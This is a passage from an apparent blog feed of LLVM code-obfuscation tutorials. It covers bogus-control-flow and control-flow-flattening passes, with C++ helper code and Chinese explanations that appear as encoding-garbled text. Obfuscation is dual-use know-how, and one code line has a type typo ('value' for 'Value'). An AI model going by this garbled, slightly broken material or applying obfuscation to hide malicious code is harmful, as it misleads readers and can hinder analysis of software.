class="built_in">getTerminator</span>()-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line">    <span class="comment">// 2. åœ¨ entryBB å’Œ bodyBB çš„æœ«å°¾æ’å…¥æ¡ä»¶ æ’ä¸ºçœŸ çš„è™šå‡æ¯”è¾ƒæŒ‡ä»¤</span></span><br><span class="line">    Value *cond1 = <span class="built_in">createBogusCmp</span>(entryBB); </span><br><span class="line">    Value *cond2 = <span class="built_in">createBogusCmp</span>(bodyBB); </span><br><span class="line">    <span class="comment">// 3. å°† entryBB åˆ° bodyBB çš„ç»å¯¹è·³è½¬æ”¹ä¸ºæ¡ä»¶è·³è½¬ï¼Œæ¡ä»¶ä¸º cond1ï¼Œä¸ºçœŸè·³è½¬ bodyBBï¼Œä¸ºå‡è·³è½¬ cloneBB</span></span><br><span class="line">    BranchInst::<span class="built_in">Create</span>(bodyBB, cloneBB, cond1, entryBB);</span><br><span class="line">    <span class="comment">// 4. å°† bodyBB åˆ° endBBçš„ç»å¯¹è·³è½¬æ”¹ä¸ºæ¡ä»¶è·³è½¬ï¼Œæ¡ä»¶ä¸º cond2ï¼Œä¸ºçœŸè·³è½¬ endBBï¼Œä¸ºå‡è·³è½¬ cloneBB</span></span><br><span class="line">    BranchInst::<span class="built_in">Create</span>(endBB, cloneBB, cond2, bodyBB);</span><br><span class="line">    <span class="comment">// 5. æ·»åŠ  bodyBB.clone åˆ° bodyBB çš„ç»å¯¹è·³è½¬</span></span><br><span class="line">    BranchInst::<span class="built_in">Create</span>(bodyBB, cloneBB);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> BogusControlFlow::ID = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;BogusControlFlow&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;bcf&quot;</span>, <span class="string">&quot;Add bogus control flow to each function.&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="Utils-cpp"><a href="#Utils-cpp" class="headerlink" title="Utils.cpp"></a>Utils.cpp</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Instructions.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/Utils/Local.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/Utils/ValueMapper.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/Utils/Cloning.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Utils.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> std::vector;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line">LLVMContext *CONTEXT = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">llvm::fixStack</span><span class="params">(Function &amp;F)</span> </span>&#123;</span><br><span class="line">    vector&lt;PHINode*&gt; origPHI;</span><br><span class="line">    vector&lt;Instruction*&gt; origReg;</span><br><span class="line">    BasicBlock &amp;entryBB = F.<span class="built_in">getEntryBlock</span>();</span><br><span class="line">    <span class="keyword">for</span>(BasicBlock &amp;BB : F)&#123;</span><br><span class="line">        <span class="keyword">for</span>(Instruction &amp;I : BB)&#123;</span><br><span class="line">            <span class="keyword">if</span>(PHINode *PN = <span class="built_in">dyn_cast</span>&lt;PHINode&gt;(&amp;I))&#123;</span><br><span class="line">                origPHI.<span class="built_in">push_back</span>(PN);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!(<span class="built_in">isa</span>&lt;AllocaInst&gt;(&amp;I) &amp;&amp; I.<span class="built_in">getParent</span>() == &amp;entryBB) </span><br><span class="line">                &amp;&amp; I.<span class="built_in">isUsedOutsideOfBlock</span>(&amp;BB))&#123;</span><br><span class="line">                origReg.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(PHINode *PN : origPHI)&#123;</span><br><span class="line">        <span class="built_in">DemotePHIToStack</span>(PN, entryBB.<span class="built_in">getTerminator</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(Instruction *I : origReg)&#123;</span><br><span class="line">        <span class="built_in">DemoteRegToStack</span>(*I, entryBB.<span class="built_in">getTerminator</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BasicBlock* <span class="title">llvm::createCloneBasicBlock</span><span class="params">(BasicBlock *BB)</span></span>&#123;</span><br><span class="line">    <span class="comment">// å…‹éš†ä¹‹å‰å…ˆä¿®å¤æ‰€æœ‰é€ƒé€¸å˜é‡</span></span><br><span class="line">    vector&lt;Instruction*&gt; origReg;</span><br><span class="line">    BasicBlock &amp;entryBB = BB-&gt;<span class="built_in">getParent</span>()-&gt;<span class="built_in">getEntryBlock</span>();</span><br><span class="line">    <span class="keyword">for</span>(Instruction &amp;I : *BB)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="built_in">isa</span>&lt;AllocaInst&gt;(&amp;I) &amp;&amp; I.<span class="built_in">getParent</span>() == &amp;entryBB) </span><br><span class="line">            &amp;&amp; I.<span class="built_in">isUsedOutsideOfBlock</span>(BB))&#123;</span><br><span class="line">            origReg.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(Instruction *I : origReg)&#123;</span><br><span class="line">        <span class="built_in">DemoteRegToStack</span>(*I, entryBB.<span class="built_in">getTerminator</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªæ˜ å°„è¡¨ç±»å‹å˜é‡</span></span><br><span class="line">    ValueToValueMapTy VMap;</span><br><span class="line">    BasicBlock *cloneBB = <span class="built_in">cloneBasicBlock</span>(BB, VMap, BB-&gt;<span class="built_in">getName</span>() + <span class="string">&quot;cloneBB&quot;</span>, BB-&gt;<span class="built_in">getParent</span>());</span><br><span class="line">    <span class="comment">// å¯¹å…‹éš†åŸºæœ¬å—çš„å¼•ç”¨è¿›è¡Œä¿®å¤</span></span><br><span class="line">    <span class="keyword">for</span>(Instruction &amp;I : *cloneBB)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; I.<span class="built_in">getNumOperands</span>();i ++)&#123;</span><br><span class="line">            value *V = <span class="built_in">MapValue</span>(I.<span class="built_in">getOperand</span>(i), VMap);</span><br><span class="line">            <span class="comment">// å¦‚æœæ˜ å°„å‡ºæ¥ä¸ä¸ºç©ºï¼Œï¼ˆæˆåŠŸï¼‰</span></span><br><span class="line">            <span class="keyword">if</span>(V)&#123;</span><br><span class="line">                I.<span class="built_in">setOperand</span>(i, V);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cloneBB;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Utils-h"><a href="#Utils-h" class="headerlink" title="Utils.h"></a>Utils.h</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __UTILS_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __UTILS_H__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CONTEXT(F) CONTEXT=&amp;F.getContext()</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TYPE_I32 Type::getInt32Ty(*CONTEXT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST_I32(V) ConstantInt::get(TYPE_I32, V, false)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST(T, V) ConstantInt::get(T, V)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> llvm::LLVMContext *CONTEXT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> llvm&#123;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">fixStack</span><span class="params">(Function &amp;F)</span></span>;</span><br><span class="line">    <span class="function">BasicBlock* <span class="title">createCloneBasicBlock</span><span class="params">(BasicBlock *BB)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> hackæŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç æ··æ·† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>llvmä»£ç æ··æ·†å­¦ä¹ ï¼ˆäº”ï¼‰</title>
      <link href="/posts/58008/"/>
      <url>/posts/58008/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢</p><p>éšä¾¿å­¦å­¦ llvm ä»£ç æ··æ·†ï¼Œé¡ºä¾¿åšä¸ªæ¯•è®¾ï¼Œæ°´å‡ ç¯‡æ–‡ç« å°±å½“åšåšç¬”è®°</p></blockquote><h1 id="æ§åˆ¶æµå¹³å¦åŒ–åŸç†åˆ†æ"><a href="#æ§åˆ¶æµå¹³å¦åŒ–åŸç†åˆ†æ" class="headerlink" title="æ§åˆ¶æµå¹³å¦åŒ–åŸç†åˆ†æ"></a>æ§åˆ¶æµå¹³å¦åŒ–åŸç†åˆ†æ</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>æ§åˆ¶æµå¹³å¦åŒ–æŒ‡çš„æ˜¯å°†æ­£å¸¸æ§åˆ¶æµä¸­åŸºæœ¬å—ä¹‹é—´çš„è·³è½¬å…³ç³»åˆ é™¤ï¼Œç”¨ä¸€ä¸ªé›†ä¸­çš„åˆ†å‘å—æ¥è°ƒåº¦åŸºæœ¬å—çš„æ‰§è¡Œé¡ºåºã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215152327999.png" alt="image-20230215152327999"></p><h2 id="ç»“æ„"><a href="#ç»“æ„" class="headerlink" title="ç»“æ„"></a>ç»“æ„</h2><ul><li><strong>å…¥å£å—</strong>ï¼šè¿›å…¥å‡½æ•°ç¬¬ä¸€ä¸ªæ‰§è¡Œçš„åŸºæœ¬å—ã€‚</li><li><strong>ä¸»åˆ†å‘å—ä¸å­åˆ†å‘å—</strong>ï¼šè´Ÿè´£è·³è½¬åˆ°ä¸‹ä¸€ä¸ªè¦æ‰§è¡Œçš„åŸåŸºæœ¬å—ã€‚</li><li><strong>åŸåŸºæœ¬å—</strong>ï¼šæ··æ·†ä¹‹å‰çš„åŸºæœ¬å—ï¼ŒçœŸæ­£å®Œæˆç¨‹åºå·¥ä½œçš„åŸºæœ¬å—ã€‚</li><li><strong>è¿”å›å—</strong>ï¼šè¿”å›åˆ°ä¸»åˆ†å‘å—ã€‚</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215152513926.png"></p><p>æ‰€æœ‰å®ŒæˆåŸç¨‹åºåŠŸèƒ½çš„åŸåŸºæœ¬å—å¹³è¡Œæ’åˆ—åœ¨è¿”å›å—ä¸Šæ–¹ï¼Œidaåæ±‡ç¼–å‡ºæ¥çœ‹èµ·æ¥å°±æ˜¯ä¸€æ’ï¼Œä¹Ÿå°±æ˜¯å¹³å¦åŒ–çš„ç”±æ¥ã€‚</p><h2 id="æ··æ·†æ•ˆæœ"><a href="#æ··æ·†æ•ˆæœ" class="headerlink" title="æ··æ·†æ•ˆæœ"></a>æ··æ·†æ•ˆæœ</h2><p>åˆ†ææ­£å¸¸çš„æ§åˆ¶æµæ—¶ï¼Œèƒ½å¾ˆå®¹æ˜“çš„åˆ†æå‡ºç¨‹åºçš„æ‰§è¡Œé¡ºåºï¼Œä»¥åŠæ¯ä¸€æ®µä»£ç å®Œæˆçš„å·¥ä½œï¼ˆä¸€æ®µä»£ç å¯èƒ½ç”±å¤šä¸ªç›¸äº’å…³è”çš„åŸºæœ¬å—ç»„æˆï¼‰ï¼Œè¿›è€ŒæŒæ¡æ•´ä¸ªç¨‹åºçš„é€»è¾‘ã€‚</p><p>åˆ†æå¹³å¦åŒ–åçš„æ§åˆ¶æµæ—¶ï¼Œåœ¨ä¸çŸ¥é“åŸºæœ¬å—æ‰§è¡Œé¡ºåºçš„æƒ…å†µä¸‹ï¼Œåˆ†åˆ«å¯¹æ¯ä¸€ä¸ªåŸºæœ¬å—è¿›è¡Œåˆ†ææ˜¯å¾ˆéš¾çš„ï¼Œè€Œå¦‚æœè¦å¾—çŸ¥æ¯ä¸€ä¸ªåŸºæœ¬å—çš„æ‰§è¡Œé¡ºåºï¼Œå¿…é¡»åˆ†æåˆ†å‘å—çš„è°ƒåº¦é€»è¾‘ã€‚</p><p>å®é™…ä¸Šå½“å‡½æ•°æ¯”è¾ƒå¤æ‚æ—¶ï¼Œé€šè¿‡æ‰‹åŠ¨åˆ†æåˆ†å‘å—è¿˜åŸåŸåŸºæœ¬å—çš„æ‰§è¡Œé¡ºåºæ˜¯éå¸¸å¤æ‚çš„ã€‚</p><p>æ§åˆ¶æµå¹³å¦åŒ–æ··æ·†åçš„ä¼ªä»£ç ï¼Œwhile + switch ç»“æ„å¯¹åº”å¹³å¦åŒ–åçš„æ§åˆ¶æµç»“æ„ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215152840664.png" alt="image-20230215152840664"></p><h1 id="æ§åˆ¶æµå¹³å¦åŒ–ä»£ç å®ç°æ€è·¯"><a href="#æ§åˆ¶æµå¹³å¦åŒ–ä»£ç å®ç°æ€è·¯" class="headerlink" title="æ§åˆ¶æµå¹³å¦åŒ–ä»£ç å®ç°æ€è·¯"></a>æ§åˆ¶æµå¹³å¦åŒ–ä»£ç å®ç°æ€è·¯</h1><h2 id="æ¶æ„"><a href="#æ¶æ„" class="headerlink" title="æ¶æ„"></a>æ¶æ„</h2><ul><li><p>å…¥å£å—</p></li><li><p>åˆ†å‘å—</p></li><li><p>è¿”å›å—</p></li><li><p>åŸåŸºæœ¬å—</p></li></ul><h2 id="å®ç°æ­¥éª¤"><a href="#å®ç°æ­¥éª¤" class="headerlink" title="å®ç°æ­¥éª¤"></a>å®ç°æ­¥éª¤</h2><h3 id="ç¬¬ä¸€æ­¥ï¼šä¿å­˜åŸåŸºæœ¬å—"><a href="#ç¬¬ä¸€æ­¥ï¼šä¿å­˜åŸåŸºæœ¬å—" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šä¿å­˜åŸåŸºæœ¬å—"></a>ç¬¬ä¸€æ­¥ï¼šä¿å­˜åŸåŸºæœ¬å—</h3><p>å°†é™¤å…¥å£å—ä»¥å¤–çš„åŸºæœ¬å—ä¿å­˜åˆ° vector å®¹å™¨ä¸­ï¼Œæ–¹ä¾¿åç»­å¤„ç†ã€‚</p><p>å¦‚æœå…¥å£å—çš„ç»ˆç»“æŒ‡ä»¤æ˜¯æ¡ä»¶åˆ†æ”¯æŒ‡ä»¤ï¼Œåˆ™å°†è¯¥æŒ‡ä»¤å•ç‹¬åˆ†ç¦»å‡ºæ¥ä½œä¸ºä¸€ä¸ªåŸºæœ¬å—ï¼ŒåŠ å…¥åˆ° vector å®¹å™¨çš„æœ€å‰é¢ã€‚</p><blockquote><p>ä¸ºäº†ä¿è¯å…¥å£å—çš„æœ€åä¸€æ¡æŒ‡ä»¤ä¸€å®šæ˜¯ä¸€æ¡éæ¡ä»¶è·³è½¬æŒ‡ä»¤ï¼Œä¿è¯å…¶åªæœ‰ä¸€ä¸ªåç»§å—ã€‚</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215155701008.png" alt="image-20230215155701008"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å°†é™¤å…¥å£å—ä»¥å¤–çš„åŸºæœ¬å—ä¿å­˜åˆ° vector å®¹å™¨ä¸­ï¼Œæ–¹ä¾¿åç»­å¤„ç†</span></span><br><span class="line"><span class="comment">// é¦–å…ˆä¿å­˜æ‰€æœ‰åŸºæœ¬å—</span></span><br><span class="line">vector&lt;BasicBlock*&gt; origBB;</span><br><span class="line"><span class="keyword">for</span>(BasicBlock &amp;BB : F)&#123;</span><br><span class="line">    origBB.<span class="built_in">push_back</span>(&amp;BB);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ä» vector ä¸­å»é™¤ç¬¬ä¸€ä¸ªåŸºæœ¬å—</span></span><br><span class="line"><span class="comment">// å› ä¸ºç¬¬ä¸€ä¸ªåŸºæœ¬å—ä¸€å®šæ˜¯å…¥å£å—</span></span><br><span class="line">origBB.<span class="built_in">erase</span>(origBB.<span class="built_in">begin</span>());</span><br><span class="line">BasicBlock &amp;entryBB = F.<span class="built_in">getEntryBlock</span>();</span><br><span class="line"><span class="comment">// åˆ¤æ–­ï¼šå¦‚æœç¬¬ä¸€ä¸ªåŸºæœ¬å—çš„æœ«å°¾æ˜¯æ¡ä»¶è·³è½¬ -&gt; å•ç‹¬åˆ†ç¦»</span></span><br><span class="line"><span class="comment">// dyn_castï¼šç”¨æ¥ç±»å‹åˆ¤æ–­å’Œç±»å‹è½¬æ¢ï¼Œå¦‚æœç»™å®šå‚æ•°ï¼ˆentryBB.getTerminator()ï¼‰ç¬¦åˆæƒ³è¦ç±»å‹ï¼ˆBranchInstï¼‰ï¼Œè¿›è¡Œè½¬æ¢ï¼Œè½¬æ¢æˆï¼ˆBranchInst *brï¼‰ï¼Œå¦‚æœä¸ç¬¦åˆç±»å‹ï¼Œè¿”å›ä¸€ä¸ª nullptr ç©ºæŒ‡é’ˆ</span></span><br><span class="line"><span class="keyword">if</span>(BranchInst *br = <span class="built_in">dyn_cast</span>&lt;BranchInst&gt;(entryBB.<span class="built_in">getTerminator</span>()))&#123;</span><br><span class="line">    <span class="keyword">if</span>(br-&gt;<span class="built_in">isConditional</span>())&#123;</span><br><span class="line">        <span class="comment">// åˆ†ç¦»è·³è½¬æŒ‡ä»¤ä½œä¸ºæ–°åŸºæœ¬å¿«ï¼Œæ’å…¥åˆ° vector å®¹å™¨æœ€å‰ç«¯</span></span><br><span class="line">        BasicBlock *newBB = entryBB.<span class="built_in">splitBasicBlock</span>(br, <span class="string">&quot;newBB&quot;</span>);</span><br><span class="line">        origBB.<span class="built_in">insert</span>(origBB.<span class="built_in">begin</span>(), newBB);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>dyn_cast</code>å‡½æ•°ï¼šç”¨æ¥ç±»å‹åˆ¤æ–­å’Œç±»å‹è½¬æ¢ï¼Œå¦‚æœç»™å®šå‚æ•°ï¼ˆ<code>entryBB.getRerminator()</code>ï¼‰ç¬¦åˆæƒ³è¦ç±»å‹ï¼ˆ<code>BranchInst</code>ï¼‰ï¼Œè¿›è¡Œè½¬æ¢ï¼Œè½¬æ¢æˆï¼ˆ<code>BranchInst *br</code>ï¼‰ï¼Œå¦‚æœä¸ç¬¦åˆç±»å‹ï¼Œè¿”å›ä¸€ä¸ª <code>nullptr</code> ç©ºæŒ‡é’ˆã€‚</p><p><code>isConditional</code>å‡½æ•°ï¼šåˆ¤æ–­æ˜¯å¦æ˜¯æ¡ä»¶è·³è½¬æŒ‡ä»¤ã€‚</p><h3 id="ç¬¬äºŒæ­¥ï¼šåˆ›å»ºåˆ†å‘å—å’Œè¿”å›å—"><a href="#ç¬¬äºŒæ­¥ï¼šåˆ›å»ºåˆ†å‘å—å’Œè¿”å›å—" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šåˆ›å»ºåˆ†å‘å—å’Œè¿”å›å—"></a>ç¬¬äºŒæ­¥ï¼šåˆ›å»ºåˆ†å‘å—å’Œè¿”å›å—</h3><p>é™¤äº†åŸåŸºæœ¬å—ä¹‹å¤–ï¼Œè¿˜è¦ç»­åˆ›å»ºä¸€ä¸ªåˆ†å‘å—æ¥è°ƒåº¦åŸºæœ¬å—çš„æ‰§è¡Œé¡ºåºï¼Œå¹¶å»ºç«‹å…¥å£å—åˆ°åˆ†å‘å—çš„ç»å¯¹è·³è½¬ã€‚</p><p>å†åˆ›å»ºä¸€ä¸ªè¿”å›å—ï¼ŒåŸåŸºæœ¬å—æ‰§è¡Œå®Œåéƒ½éœ€è¦è·³è½¬åˆ°è¿™ä¸ªè¿”å›å—ï¼Œè¿”å›å—ä¼šç›´æ¥è·³è½¬åˆ°åˆ†å‘å—ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215160237600.png" alt="image-20230215160237600"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºåˆ†å‘å—å’Œè¿”å›å—</span></span><br><span class="line">BasicBlock *dispatchBB = BasicBlock::<span class="built_in">Create</span>(F.<span class="built_in">getContext</span>(), <span class="string">&quot;dispatchBB&quot;</span>, &amp;F, &amp;entryBB);</span><br><span class="line">BasicBlock *returnBB = BasicBlock::<span class="built_in">Create</span>(F.<span class="built_in">getContext</span>(), <span class="string">&quot;returnBB&quot;</span>, &amp;F, &amp;entryBB);</span><br><span class="line"><span class="comment">// æ­¤æ—¶çš„å—é¡ºåºå¦‚ä¸‹</span></span><br><span class="line"><span class="comment">/*-----------------------</span></span><br><span class="line"><span class="comment">    åˆ†å‘å—</span></span><br><span class="line"><span class="comment">    è¿”å›å—</span></span><br><span class="line"><span class="comment">    å…¥å£å—</span></span><br><span class="line"><span class="comment">-----------------------*/</span></span><br><span class="line"><span class="comment">// å»ºç«‹åˆ†å‘å—å’Œè¿”å›å—çš„é“¾æ¥</span></span><br><span class="line">BranchInst::<span class="built_in">Create</span>(dispatchBB, returnBB);</span><br><span class="line"><span class="comment">// æŠŠå…¥å£å—ç§»åˆ°æœ€å‰é¢ï¼Œåˆ†å‘å—å‰é¢</span></span><br><span class="line">entryBB.<span class="built_in">moveBefore</span>(dispatchBB);</span><br><span class="line"><span class="comment">// æ­¤æ—¶çš„å—é¡ºåºå¦‚ä¸‹</span></span><br><span class="line"><span class="comment">/*-----------------------</span></span><br><span class="line"><span class="comment">    å…¥å£å—</span></span><br><span class="line"><span class="comment">    åˆ†å‘å—</span></span><br><span class="line"><span class="comment">    è¿”å›å—</span></span><br><span class="line"><span class="comment">-----------------------*/</span></span><br><span class="line"><span class="comment">// å»é™¤å…¥å£å—æœ«å°¾çš„è·³è½¬</span></span><br><span class="line">entryBB.<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line"><span class="comment">// ä½¿å…¥å£å—è·³è½¬åˆ° dispatchBBï¼ŒbrDispatchBB ä¹Ÿå°±æ˜¯å…¥å£å—çš„ç»ˆç»“æŒ‡ä»¤</span></span><br><span class="line">BranchInst *brDispatchBB = BranchInst::<span class="built_in">Create</span>(dispatchBB, &amp;entryBB);</span><br></pre></td></tr></table></figure><p><code>BasicBlock::Create</code>å‡½æ•°ï¼šåˆ›å»ºåŸºæœ¬å—å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ LLVM Context ç±»å‹ï¼Œå¯ç”¨<code>getContext</code>æ–¹æ³•è·å–ï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ–°å»ºå—çš„åç§°ï¼ˆ<code>dispatchBB</code>ï¼‰ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯å‡½æ•°æŒ‡é’ˆï¼Œå³åœ¨å“ªä¸ªå‡½æ•°ï¼ˆ<code>F</code>ï¼‰é‡Œé¢åˆ›å»ºåŸºæœ¬å—ï¼›ç¬¬å››ä¸ªå‚æ•°æŒ‡å®šåˆ›å»ºçš„åŸºæœ¬å—è¢«ç§»åŠ¨åˆ°å“ªä¸ªåŸºæœ¬å—ï¼ˆ<code>entryBB</code>ï¼‰çš„å‰é¢ã€‚</p><p><code>BranchInst::Create(dispatchBB, returnBB)</code>æ— æ¡ä»¶å‡½æ•°ï¼šåœ¨åŸºæœ¬å—<code>returnBB</code>çš„æœ«å°¾æ·»åŠ ä¸€æ¡<code>br</code>æŒ‡ä»¤ï¼ˆæ— æ¡ä»¶è·³è½¬ï¼‰ã€‚å³ç›´æ¥ä»åŸºæœ¬å—<code>returnBB</code>è·³è½¬åˆ°å¦ä¸€ä¸ªåŸºæœ¬å—<code>dispatchBB</code>ã€‚</p><p><code>BranchInst::Create(ForBodyBB, ForEndBB, Cmp, ForCondBB)</code>æœ‰æ¡ä»¶å‡½æ•°ï¼šåœ¨åŸºæœ¬å—<code>ForCondBB</code>çš„æœ«å°¾æ·»åŠ ä¸€æ¡<code>br</code>æŒ‡ä»¤ï¼ˆæœ‰æ¡ä»¶è·³è½¬ï¼‰ã€‚å³å¦‚æœå±€éƒ¨å˜é‡<code>Cmp</code>æ‰€è¡¨ç¤ºçš„å€¼ä¸º<code>true</code>ï¼Œåˆ™è·³è½¬åˆ°åŸºæœ¬å—<code>ForBodyBB</code>ï¼›å¦åˆ™ï¼Œè·³è½¬åˆ°åŸºæœ¬å—<code>ForEndBB</code>ã€‚</p><p><code>moveBefore</code>æ–¹æ³•ï¼šç§»åŠ¨ä¸€ä¸ªåŸºæœ¬å—ï¼ˆ<code>entryBB</code>ï¼‰åˆ°å¦ä¸€ä¸ªåŸºæœ¬å—ï¼ˆ<code>dispatchBB</code>ï¼‰å‰é¢ã€‚</p><p><code>getTerminator</code>æ–¹æ³•ï¼šè·å–åŸºæœ¬å—æœ€åä¸€æ¡æŒ‡ä»¤ã€‚</p><p><code>eraseFromParent</code>æ–¹æ³•ï¼šåˆ é™¤æŒ‡ä»¤ã€‚</p><h3 id="ç¬¬ä¸‰æ­¥ï¼šå®ç°åˆ†å‘å—è°ƒåº¦"><a href="#ç¬¬ä¸‰æ­¥ï¼šå®ç°åˆ†å‘å—è°ƒåº¦" class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼šå®ç°åˆ†å‘å—è°ƒåº¦"></a>ç¬¬ä¸‰æ­¥ï¼šå®ç°åˆ†å‘å—è°ƒåº¦</h3><p>åœ¨å…¥å£å—ä¸­åˆ›å»ºå¹¶åˆå§‹åŒ– switch å˜é‡ï¼Œåœ¨è°ƒåº¦å—ä¸­æ’å…¥ switch 